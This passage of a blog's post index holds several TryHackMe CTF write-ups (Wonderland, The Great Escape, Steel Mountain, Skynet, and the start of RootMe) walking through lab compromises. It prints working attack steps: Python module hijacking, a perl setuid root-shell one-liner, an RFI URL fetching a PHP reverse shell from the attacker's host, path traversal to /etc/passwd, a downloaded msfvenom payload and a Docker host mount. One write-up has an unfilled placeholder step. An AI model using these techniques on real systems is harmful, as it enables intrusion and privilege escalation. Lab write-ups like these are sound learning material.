(Go-IPFS json-rpc or InfluxDB API)|_http-title: Follow the white rabbit.Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Mar 14 00:30:54 2021 -- 1 IP address (1 host up) scanned in 35.96 secondsAccording to the scan, ports 22 (SSH) and 80 (HTTP) are open. I then navigated to the website to manually investigate whilst gobuster was running in the background:$ gobuster dir -e -u 10.10.7.151 -w /usr/share/wordlists/dirb/common.txt===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://10.10.7.151[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Expanded: true[+] Timeout: 10s===============================================================2021/03/14 00:33:52 Starting gobuster===============================================================http://10.10.7.151/img (Status: 301)http://10.10.7.151/index.html (Status: 301)http://10.10.7.151/r (Status: 301)===============================================================2021/03/14 00:34:12 Finished===============================================================Whilst manually crawling through the website, I discovered the /img directory and downloaded each image onto my machine. I then used steghide to see if there was anything embedded in the images:$ steghide extract -sf white_rabbit_1.jpgEnter passphrase:wrote extracted data to \"hint.txt\".$ cat hint.txtfollow the r a b b i tThe gobuster output revealed a /r directory. Navigating to this shows:From the hint.txt, I realised that there within this directory there is a /a directory. So, navigating to /r/a/b/b/i/t reveals:Inspecting the source code of this page revealed a hidden paragraph:&lt;p style=\"display: none;\"&gt;alice:H********************************************l&lt;/p&gt;This looks like a username:password combination. So, I can now login via SSH:The alice user’s home directory shows two files: root.txt: cannot be read. walrus_and_the_carpenter.py: script that prints 10 random lines from a poem string.I decided to inspect what commands we can run as alice:$ sudo --list[sudo] password for alice:Matching Defaults entries for alice on wonderland: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser alice may run the following commands on wonderland: (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.pyLooks like we can run the Python file. Sample output:$ python walrus_and_the_carpenter.pyThe line was: \"The night is fine,\" the Walrus saidThe line was: Holding his pocket handkerchiefThe line was: The sun was shining on the sea,The line was: The Carpenter said nothing butThe line was: \"The time has come,\" the Walrus said,The line was: And made them trot so quick!\"The line was: Pepper and vinegar besidesThe line was: Before his streaming eyes.The line was: With sobs and tears he sorted outThe line was: And why the sea is boiling hot —This means we can hijack the module and spawn a bash shell by creating a random.py file in the same directory. Here is a link to the article which I used: click here.My random.py file simply imports os and pty, and then uses .spawn() to create a bash shell process. I can then execute this as the rabbit user, completing the privilege escalation.\"\"\" random.py - python module hijacking \"\"\"import osimport ptypty.spawn('/bin/bash')The result:alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.pyrabbit@wonderland:~$Within the rabbit user’s /home directory there is a executable file named teaParty:rabbit@wonderland:/home/rabbit$ ./teaPartyWelcome to the tea party!The Mad Hatter will be here soon.Probably by Sun, 14 Mar 2021 02:03:38 +0000Ask very nicely, and I will give you some tea while you wait for himSegmentation fault (core dumped)I downloaded this file onto my own machine using Python’s http.server. On the room machine, I ran:rabbit@wonderland:/home/rabbit$ python3.6 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...10.9.150.161 - - [14/Mar/2021 01:10:29] \"GET /teaParty HTTP/1.1\" 200 -And, on my machine, I ran:$ wget http://10.10.7.151:8000/teaParty--2021-03-14 01:10:29-- http://10.10.7.151:8000/teaPartyConnecting to 10.10.7.151:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 16816 (16K) [application/octet-stream]Saving to: ‘teaParty’teaParty 100%[===============&gt;] 16.42K --.-KB/s in 0.07s 2021-03-14 01:10:29 (237 KB/s) - ‘teaParty’ saved [16816/16816]After analysing the decompiled code, I found that “Segmentation fault (core dumped)” is printed as a string, and is not an error. I then noticed that the date module was being called, so I used the same module hijacking exploit that used earlier. I first created a file called date:#!/bin/bashecho \"Hijacking date module...\"/bin/bashWhen run, this escalates privileges to become the hatter user. Navigating to their home directory reveals a password.txt file which contains their login credentials.W*************************kUsing sudo -l, it appears that this user has perl capabilities. This means I can do further privilege escalation by setting the UID of hatter to 0 (root):hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX:;setuid(0); exec \"/bin/sh\";'# ls /home/alice__pycache__ random.py root.txt walrus_and_the_carpenter.py# cat /home/alice/root.txtthm{T********************************************************!}Going further into the /root directory:# ls -la /roottotal 28drwx--x--x 4 root root 4096 May 25 2020 .drwxr-xr-x 23 root root 4096 May 25 2020 ..lrwxrwxrwx 1 root root 9 May 25 2020 .bash_history -&gt; /dev/null-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwxr-xr-x 3 root root 4096 May 25 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 May 25 2020 .ssh-rw-r--r-- 1 root root 32 May 25 2020 user.txt# cat /root/user.txt thm{\"C**********************!\"}#And that’s it! All done!Summary and FeedbackThis challenge really tested my knowledge of privilege escalation. If you are more of a beginner, I would strongly recommend trying one of the easier rooms as I didn’t know many of the tactics used in this guide (found due to extensive Googling)." }, { "title": "The Great Escape Writeup | TryHackMe", "url": "/posts/the-great-escape-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, security, docker, ssrf, injection", "date": "2022-01-29 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the “The Great Escape” CTF. This challenge was a lot of fun, but very difficult (as you will see). I would recommend this if you have completed other docker-related CTFs - you will definitely find this a lot easier than I did.How to AccessI completed this through TryHackMe. I’m not aware of this being hosted anywhere else but if it is then I will amend this guide.Link to the room https://tryhackme.com/room/thegreatescapeStepsThere are obviously multiple ways to do this challenge and I would strongly recommend that you look at other published writeups to learn the different ways you can tackle this, especially the final part.A Simple Web AppStart off with a simple webapp. Can you find the hidden flag?HINT: A well-known file may offer some help.The first thing I did was to see what was happening on the machine. I used nmap for this:# Nmap 7.91 scan initiated Wed Feb 17 20:15:27 2021 as: nmap -sC -sV -oN initial_scan 10.10.148.224Nmap scan report for 10.10.148.224Host is up (0.048s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh?| fingerprint-strings:| GenericLines:|_ +9%SWIE/at-*u5d[k,%Z|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)80/tcp open http nginx 1.19.6| http-robots.txt: 3 disallowed entries|_/api/ /exif-util /*.bak.txt$|_http-server-header: nginx/1.19.6|_http-title: docker-escape-nuxt|_http-trane-info: Problem with XML parsing of /evox/about1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port22-TCP:V=7.91%I=7%D=2/17%Time=602D796D%P=x86_64-pc-linux-gnu%r(GeneSF:ricLines,16,\"\\+9%SWIE/at-\\*u5d\\[k,%Z\\r\\n\");Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Feb 17 20:18:41 2021 -- 1 IP address (1 host up) scanned in 193.73 secondsFrom the above, it shows that the machine is open on ports 22 (ssh) and 80 (web page). So, I go check out the website. While I did this, I was running GoBuster in the background to check for any funky directories on the primary site, but everything it tried returned a 200 status code.There wasn’t a whole lot to this site (on the face of it at least); just a homepage, a login/sign-up page. Looking at the hint, I realised that the site may have a “robots.txt” file, and, sure enough, it did!User-agent: *Allow: /Disallow: /api/I then decided to run GoBuster on the /api portion of the site, but to no avail. The robots.txt file does indicate another page: /exif-util, so I decided to have a look:This appeared to be a file upload for images. After trying a bunch of file uploads with various formats, I decided to give up on this portion and do some more research.I decided to look into other well-known practices for building websites and stumbled across an article which detailed a standard in which devs place a security.txt file within the .well-known directory. I now realised what the clue was hinting at.Navigating to this file gave me this text:Hey you found me!The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.See https://securitytxt.org/ for more information.Ping /api/fl46 with a HEAD request for a nifty treat.Nice! I decided to breakout curl for this next part:$ curl -I http://10.10.148.224/api/fl46HTTP/1.1 200 OKServer: nginx/1.19.6Date: Wed, 17 Feb 2021 20:32:40 GMTConnection: keep-aliveflag: THM{b80**************************ad4}And that was flag 1.Root! Root?There’s a flag hidden by root on one of the machines. Can you find it?HINT: Silly devs leaving their backups lying around…After some extensive head scratching, I decided the best option was to try and play about with the API using this /exif-util page. When I uploaded an image using a URL, it returned something like this:EXIF:----------------------[PNG-IHDR] Image Width - 600[PNG-IHDR] Image Height - 300[PNG-IHDR] Bits Per Sample - 8[PNG-IHDR] Color Type - True Color with Alpha[PNG-IHDR] Compression Type - Deflate[PNG-IHDR] Filter Method - Adaptive[PNG-IHDR] Interlace Method - No Interlace[PNG-sRGB] sRGB Rendering Intent - Perceptual[PNG-gAMA] Image Gamma - 0.455[PNG-pHYs] Pixels Per Unit X - 3778[PNG-pHYs] Pixels Per Unit Y - 3778[PNG-pHYs] Unit Specifier - Metres[File Type] Detected File Type Name - PNG[File Type] Detected File Type Long Name - Portable Network Graphics[File Type] Detected MIME Type - image/png[File Type] Expected File Name Extension - pngXMP:----------------------&lt;/code&gt;&lt;/pre&gt;Going into the console, on the network tab, I saw that there was a call being made to the API. I then confirmed this using curl and, sure enough, I got the same output:&lt;pre&gt;&lt;code&gt;$ curl http://10.10.148.224/api/exif?url=http:%2F%2F10.10.148.224%2F_nuxt%2Fimg%2Flogo-light.49baa3d.pngEXIF:----------------------[PNG-IHDR] Image Width - 600[PNG-IHDR] Image Height - 300[PNG-IHDR] Bits Per Sample - 8[PNG-IHDR] Color Type - True Color with Alpha[PNG-IHDR] Compression Type - Deflate[PNG-IHDR] Filter Method - Adaptive[PNG-IHDR] Interlace Method - No Interlace[PNG-sRGB] sRGB Rendering Intent - Perceptual[PNG-gAMA] Image Gamma - 0.455[PNG-pHYs] Pixels Per Unit X - 3778[PNG-pHYs] Pixels Per Unit Y - 3778[PNG-pHYs] Unit Specifier - Metres[File Type] Detected File Type Name - PNG[File Type] Detected File Type Long Name - Portable Network Graphics[File Type] Detected MIME Type - image/png[File Type] Expected File Name Extension - pngXMP:----------------------I then began to run a bunch of other stuff to confirm that they are interpreted by the URL. I didn’t appear that the system had python, netcat, or anything else installed - except curl and git.I then remembered that this section is talking about backups. Going back to notes I made earlier, I realised that .bak.txt was specified in the robots.txt file. These .bak files are mostly created by a program that needs to store backups. Although, I had a feeling that this may have potentially been created left accidentally by one of the developers.I tried looking for various backup files for each of the pages on the site and eventually stumbled across the .bak file for exif-util:I continued to try some more combos with the urls I found earlier but I didn’t get anywhere.I created a short Python script so I could execute this from the terminal (just to make my life easier, I was almost at my wits end at this point).I eventually discovered…(insert injecting stuff)So now I know that I am root on this machine. There is also a suspicious dev-note.txt file in the /root directory. A simple cat gave this:$ python3 url_inject.py \"10.10.148.224\" \"cat /root/dev-note.txt\"Hey guys,Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.Anyways, the password is fluffybunnies123Cheers,HydraFinally, a username (hydra) and password (fluffybunnies123). I attempted to SSH into the machine as root and as hydra, however, SSH was acting very strange - another rabbit hole.Looking at the root directory again, I noticed a .git directory. Expanding the log gives:$ python3 url_inject.py \"10.10.148.224\" \"cd /root; git log\" commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6aAuthor: Hydra &lt;hydragyrum@example.com&gt;Date: Thu Jan 7 16:48:58 2021 +0000 fixed the dev notecommit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539Author: Hydra &lt;hydragyrum@example.com&gt;Date: Wed Jan 6 20:51:39 2021 +0000 Removed the flag and original dev note b/c Securitycommit a3d30a7d0510dc6565ff9316e3fb84434916dee8Author: Hydra &lt;hydragyrum@example.com&gt;Date: Wed Jan 6 20:51:39 2021 +0000 Added the flag and dev notesIt seems that hydra has put a flag in the bottom commit…$ python3 url_inject.py \"10.10.148.224\" \"cd /root; git checkout a3d30a7d0510dc6565ff9316e3fb84434916dee8; ls -la\" HEAD is now at a3d30a7 Added the flag and dev notestotal 40drwx------ 1 root root 4096 Feb 17 21:18 .drwxr-xr-x 1 root root 4096 Jan 7 22:14 ..lrwxrwxrwx 1 root root 9 Jan 6 20:51 .bash_history -&gt; /dev/null-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwxr-xr-x 1 root root 4096 Feb 17 21:19 .git-rw-r--r-- 1 root root 53 Jan 6 20:51 .gitconfig-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 213 Feb 17 21:18 dev-note.txt-rw-r--r-- 1 root root 75 Feb 17 21:18 flag.txtThe above shows that there are two text files; a flag (thank god) and a previous version of dev-note.$ python3 url_inject.py \"10.10.148.224\" \"cd /root; cat dev-note.txt\"Hey guys,I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.Cheers,Hydra$ python3 url_inject.py \"10.10.148.224\" \"cd /root; cat flag.txt\" You found the root flag, or did you?THM{0cb**************************876}`The Great EscapeYou thought you had root. But the root on a docker container isn’t all that helpful. Find the secret flag.Unfortunately, there is no hint for this one. Great. Looking back at the output from dev-note.txt, in the previous section, it looks like we can use port knocking on ports 42, 1337, 10420, 6969, and 63000 to check for a docker tcp port.$ curl 10.10.148.224:&lt;port&gt; -m 1I checked this worked with nmap, but no port opened. I then used the same port knocking technique with netcat and it opened port 2375.I had never used docker before so I did some research into the different commands I could use. I found I could list files similarly to a normal terminal.I didn’t really know how to proceed at this point, so I decided to take a break and come back to it the next day. I watched some other docker-related CTF tutorials and found that you can mount an image file using docker run. I first had a look to see if there were any image files available.$ DOCKER_HOST=tcp://10.10.148.224:2375 docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEexif-api-dev latest 4084cb55e1c7 4 hours ago 214MBexif-api latest 923c5821b907 5 hours ago 163MBfrontend latest 577f9da1362e 5 hours ago 138MBendlessh latest 7bde5182dc5e 24 hours ago 5.67MBnginx latest ae2feff98a0c 3 weeks ago 133MBdebian 10-slim 4a9cd57610d6 3 weeks ago 69.2MBregistry.access.redhat.com/ubi8/ubi-minimal 8.3 7331d26c1fdf 4 weeks ago 103MBalpine 3.9 78a2ce922f86 8 months ago 5.55MBThen using alpine, I mounted the image onto the mnt/host directory within the docker container. I then grabbed an interactive session with sh:$ DOCKER_HOST=tcp://$TARGET_IP:2375 docker run -it -v /:/mnt/host alpine:3.9 /bin/shI navigated to this directory and had a look around. I found there was a root directory which contained the final flag…$ ls -la /roottotal 24drwx------ 3 root root 4096 Jan 6 22:37 .drwxr-xr-x 22 root root 4096 Jan 6 16:44 ..lrwxrwxrwx 1 root root 9 Jan 6 17:22 .bash_history -&gt; /dev/null-rw-r----- 1 root root 3106 Apr 9 2018 .bashrcdrwxr-xr-x 3 root root 4096 Jan 6 22:35 .local-rw-r----- 1 root root 148 Aug 17 2015 .profile-rw------- 1 root root 74 Jan 6 22:37 flag.txt$ cat /root/flag.txtCongrats, you found the real flag!THM{c62**************************724}And that’s it!Summary and FeedbackThis was a very hard challenge. It took me a total of around 6 hours to complete this (including research) as I had never used docker in a CTF before. The first two flags were fairly easy to get (thank you Python)" }, { "title": "Steel Mountain Writeup | TryHackMe", "url": "/posts/steel-mountain-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, windows, powershell, nmap, metasploit", "date": "2022-01-28 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Steel Mountain room on TryHackMe. This room challenges you to exploit a Windows machine with, and without, metasploit. This is an easy room so if you are new to Windows exploitation and privilege escalation, then this room may be quite useful.How to AccessI completed this CTF challenge on TryHackMe.Link to the room: https://tryhackme.com/room/steelmountainStepsI began with an nmap scan:$ nmap -sC -sV -oN initial 10.10.76.203Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 21:51 BSTNmap scan report for 10.10.76.203Host is up (0.049s latency).Not shown: 988 closed portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 8.5| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/8.5|_http-title: Site doesn't have a title (text/html).135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds3389/tcp open ssl/ms-wbt-server?| ssl-cert: Subject: commonName=steelmountain| Not valid before: 2021-05-19T20:50:34|_Not valid after: 2021-11-18T20:50:34|_ssl-date: 2021-05-20T20:52:58+00:00; 0s from scanner time.8080/tcp open http HttpFileServer httpd 2.3|_http-server-header: HFS 2.3|_http-title: HFS /49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49163/tcp open msrpc Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:22:3e:9b:b5:df (unknown)| smb-security-mode: | account_used: &lt;blank&gt;| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-05-20T20:52:53|_ start_date: 2021-05-20T20:50:27Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 66.95 secondsAs you can see, there are two web servers running - one on port 80 and another on port 8080. The mainpage of the former is shown below:Inspecting the source code of the main page reveals the name of the employee of the month:I then decided to check the other web server on port 8080.Inspecting the source code shows that it is running a Rejetto HTTP File Server (version 2.3). After some research, I found that versions 2.3.x are vulnerable to remote code execution (RCE).I then booted up metasploit and configured the exploit:As shown in the above screenshot, I gained access to the machine as the bill user. The user.txt flag is stored in his Desktop:The next step is to escalate privileges. I used the PowerUp.ps1 script which can be downloaded here. I then used the upload command to upload the script to the machine:meterpreter &gt; upload /opt/windows/powersploit/Privesc/PowerUp.ps1[*] uploading : /opt/windows/powersploit/Privesc/PowerUp.ps1 -&gt; PowerUp.ps1[*] Uploaded 549.65 KiB of 549.65 KiB (100.0%): /opt/windows/powersploit/Privesc/PowerUp.ps1 -&gt; PowerUp.ps1[*] uploaded : /opt/windows/powersploit/Privesc/PowerUp.ps1 -&gt; PowerUp.ps1I then loaded powershell using load powershell and executed the script using powershell_shell:![8_CanRestart.png]As shown above, the AdvancedSystemCareService9’s CanRestart parameter is set to true, meaning that you can restart this service on the system. The directory C:\\Program Files (x86)\\IObit\\Advanced SystemCare is also write-able, meaning that you can replace the application with a malicious one.I created the exploit using msfvenom:As this was uploading, I created a netcat listener on port 443.I then uploaded it using the same command from earlier and restarted the service:Once this was complete, I was logged in as the admin user:From there, I found the root.txt flag in the C:\\Users\\Administrator\\Desktop directory:The final part of this challenge is to do it all without metasploit. This is easily done using the Python exploit found here.After downloading this exploit, I put in my IP address. The instructions state that you need to have a web server and a netcat listener active at the same time for this to work. It also tells you to download a static binary for netcat found here.In one terminal, I started the python web server, and in another I created a netcat listener. In a third terminal, I executed the Python exploit until my netcat listener caught the callback.Instead of using the PowerUp.ps1 script to find the vulnerable service, the instructions tell you to upload and execute winPEAS to enumerate the machine (found here).Similar to the metasploit methodology, you create the payload using msfvenom, only this time you pull it into the system using powershell:C:\\Program Files (x86)\\IObit&gt;powershell -c wget \"https://10.9.150.161:80/ASCService.exe\"Then, use COPY to place it into the correct directory:C:\\Program Files (x86)\\IObit&gt;COPY ASCService.exe \"Advanced SystemCare\"Finally, restart the services as before (make sure you have netcat listening):C:\\Program Files (x86)\\IObit&gt; powershell -c sc stop AdvancedSystemCareService9C:\\Program Files (x86)\\IObit&gt; powershell -c sc start AdvancedSystemCareService9And that’s it! You’ve gained root twice!Summary and FeedbackOverall this was a pretty straightforward room. For myself, Windows exploitation is not my strongest area so this machine was a learning experience for me. I hope you enjoyed this writeup." }, { "title": "Skynet Writeup | TryHackMe", "url": "/posts/skynet-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, gobuster, smb, rfi", "date": "2022-01-27 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Skynet room on TryHackMe, a vulnerable Terminator themed Linux system. This will involve using nmap, gobuster, and smbclient to gather information and enumerate Samba shares, and exploiting a remote file inclusion vulnerability on a website in order to gain access. To escalate our privileges we will use wildcard injection with tar.How to AccessI completed this room on TryHackMe. You can access it here.StepsInformation GatheringLet’s begin with an nmap scan:$ nmap -sC -sV -oN scans/initial 10.10.185.57# Nmap 7.91 scan initiated Mon May 24 20:03:30 2021 as: nmap -sC -sV -oN scans/initial 10.10.185.57Nmap scan report for 10.10.185.57Host is up (0.056s latency).Not shown: 994 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)| 256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)|_ 256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Skynet110/tcp open pop3 Dovecot pop3d|_pop3-capabilities: CAPA SASL UIDL PIPELINING AUTH-RESP-CODE TOP RESP-CODES139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap Dovecot imapd|_imap-capabilities: SASL-IR more have OK ENABLE LOGIN-REFERRALS post-login capabilities IMAP4rev1 listed LOGINDISABLEDA0001 LITERAL+ ID Pre-login IDLE445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: skynet| NetBIOS computer name: SKYNET\\x00| Domain name: \\x00| FQDN: skynet|_ System time: 2021-05-24T14:03:43-05:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-05-24T19:03:43|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon May 24 20:03:45 2021 -- 1 IP address (1 host up) scanned in 15.03 secondsThe results show that we have 6 ports open: SSH on port 22 (Ubuntu v7.2p2) HTTP on port 80 (Apache v2.4.18) Pop3 on port 110 (mail server) Netbios-ssn on port 139 (Samba share) Imap on port 143 (mail server) Netbios-ssn on port 445 (Samba share v4.3.11-Ubuntu)Let’s start with the website on port 80. While you manually crawl through the site, make sure to run gobuster to make sure you’re not missing out on any directories:$ gobuster dir -u http://10.10.185.57/ -w /usr/share/wordlists/dirb/common.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.185.57/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2021/05/24 20:05:30 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 277]/.htpasswd (Status: 403) [Size: 277]/.htaccess (Status: 403) [Size: 277]/admin (Status: 301) [Size: 312] [--&gt; http://10.10.185.57/admin/]/config (Status: 301) [Size: 313] [--&gt; http://10.10.185.57/config/]/css (Status: 301) [Size: 310] [--&gt; http://10.10.185.57/css/] /index.html (Status: 200) [Size: 523] /js (Status: 301) [Size: 309] [--&gt; http://10.10.185.57/js/] /server-status (Status: 403) [Size: 277] /squirrelmail (Status: 301) [Size: 319] [--&gt; http://10.10.185.57/squirrelmail/] ===============================================================2021/05/24 20:05:56 Finished===============================================================The mainpage of the site shows a Google-like search interface:The gobuster scan also flagged up a /squirrelmail directory:Now that we have the website enumerated, let’s move onto the Samba shares. I used smbclient for this:It shows that there are four shares: print$ anonymous milesdyson IP$Gaining Access into SambaLet’s login to the anonymous share:As shown above, there are two items on the anonymous share. The first is attention.txt which contains the following:A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.-Miles DysonIt appears that all employees had their passwords forcefully changes after a system malfunction. The second item is a /logs directory which contains three .txt files. The first of which (log1.txt) contains a list of passwords:cyborg007haloterminatorterminator22596terminator219terminator20terminator1989terminator1988terminator168terminator16terminator143terminator13terminator123!@#terminator1056terminator101terminator10terminator02terminator00roboterminatorpongterminatormanasturcaluterminatorexterminator95exterminator200dterminatordjxterminatordexterminatordeterminatorcyborg007haloterminatoravsterminatoralonsoterminatorWalterminator79terminator61996terminatorBruteforcing with HydraLet’s download this and use it as a wordlist to bruteforce the miles user’s password:This will not give you access to the SMB share as miles (remember the password reset note), but if you use this password on the squirrelmail login from earlier, you will get access to the miles user’s email:The “Samba password reset” contains the user’s new password:We can not go ahead and log in via SMB:Within the /notes directory, there is a important.txt file which contains the hidden directory for the website.Let’s see what’s on this:Again, make sure you use gobuster (enumeration, enumeration, enumaration) as it will reveal an /administrator panel:The admin panel is a login to a Cuppa CMS system.A quick look on searchsploit shows that this is vulnerable to local/remote file inclusion. This vulnerability allows attackers to retrieve files on the target machine or insert files from a remote server which they control.Exploiting CMS with Local/Remote File InclusionI first tested to see if we can retrieve the /etc/passwd file using the following command:http://&lt;ip&gt;/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwdThe ../../../../../../ specifies that we want to traverse back through the directories until we can’t go any further. Then, it will navigate to the /etc/passwd file and display it as if it were a normal webpage:Then, I was able to retrieve the user.txt flag in the /home/miles directory using a similar injection:Unfortunately, we can’t do the same for the root flag. So, we need to get access to the machine and escalate our privileges. Let’s use this remote file inclusion vulnerability to upload a reverse shell. I am using a PHP reverse shell which you can download from here.If you are doing the same make sure to change the IP to your IP address and port (optional) so that netcat can catch the callback:Next, start a python HTTP server in the directory where this shell is stored and start a netcat listener on your chosen port. Then, use the following injection:http://10.10.185.57/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://&lt;ip&gt;/php-reverse-shell.phpThis will fetch the php-reverse-shell.php file from your system as if it were a page on the site. You should have access to the system on your netcat listener:Now that we have access to the machine. let’s perfrom more enumeration to see if we can escalate our privileges. To do this, I will be using linPEAS which you can download from here. I create another python HTTP server and use wget on the target machine to download the file:Make sure to use chmod +x so that you can execute linpeas.sh on the machine. Once linPEAS finishes executing, you may notice from the output that root is running a backup.sh script every minute to create a backup of /var/www/html. The backup.sh file is as follows:#!/bin/bashcd /var/www/htmltar cf /home/milesdyson/backups/backup.tgz *Privilege Escalation via Wildcard InjectionThe use of the * wildcard means that we can replace it with some range or characters. These wildcards are interpreted by the shell before any other action has taken place. In this case, * matches any number of characters in a file name. If you are still unclear how wildcard injection works, here is an article which I found very useful.I also checked the /etc/crontab to make sure this was a scheduled event, i.e., every minute the cron job runs as root:We can now use a reverse netcat payload to escalate our privileges. On your local machine:Using the output, run the following on the target machine:With your netcat listening on port 8888, you should now be root. As you can see below, I received the callback and retrieved the root.txt flag in the /root directory:And that’s it! All done!Summary and FeedbackIn this room we: Scanned ports using nmap Used gobuster to enumerate directories Used smbclient to enumerate Samba (SMB) shares Used hydra to bruteforce email credentials Exploited CMS using a local/remote file inclusion vulnerability Used linPEAS to enumerate a Linux system Escalated our privileges by exploiting tar using wildcard injectionThis room is a very good example of what an actual CTF should be like. It is not particularly guided so you have to make sure you have a solid methodology as you work through it. It is labelled as an “easy” room but in my opinion, it is more intermediate.I hope you enjoyed this writeup." }, { "title": "RootMe Writeup | TryHackMe", "url": "/posts/rootme-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, security, web, linux, privesc", "date": "2022-01-26 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the RootMe CTF. This is a free room of easy difficulty which tests your knowledge of privilege escalation.How to AccessI completed this room on TryHackMe. The link to the room is shown below: https://tryhackme.com/room/rrootmeStepsReconnaissanceStarting off with an nmap scan, I found two open ports: 22 (ssh) and 80 (http) which is running an Apache (v2.4.29) web server:$ sudo nmap -sC -sV -oN initial 10.10.111.70[sudo] password for v3r4x: Sorry, try again.[sudo] password for v3r4x: Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 00:27 BSTNmap scan report for 10.10.111.70Host is up (0.083s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)| 256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)|_ 256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: HackIT - 